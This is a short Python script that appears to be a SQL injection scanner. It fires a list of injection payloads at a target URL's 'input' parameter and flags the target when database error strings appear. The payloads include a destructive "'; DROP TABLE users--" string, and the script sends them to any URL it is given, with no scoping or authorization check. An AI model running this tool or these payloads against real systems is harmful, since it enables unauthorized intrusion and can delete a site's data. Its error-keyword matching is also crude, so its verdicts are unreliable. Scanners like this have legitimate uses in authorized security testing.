import requests

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "' OR '1'='1' /*",
    "' OR 1=1#",
]

def scan_sql_injection(target_url):
    vulnerable_payloads = []
    try:
        for payload in SQLI_PAYLOADS:
            test_url = f"{target_url}?input={payload}"
            res = requests.get(test_url, timeout=5)
            if any(error in res.text.lower() for error in ["sql", "syntax", "mysql", "query failed", "warning"]):
                vulnerable_payloads.append(payload)

        return {
            "target": target_url,
            "vulnerable": bool(vulnerable_payloads),
            "payloads": vulnerable_payloads,
        }

    except Exception as e:
        return {"error": str(e), "target": target_url}
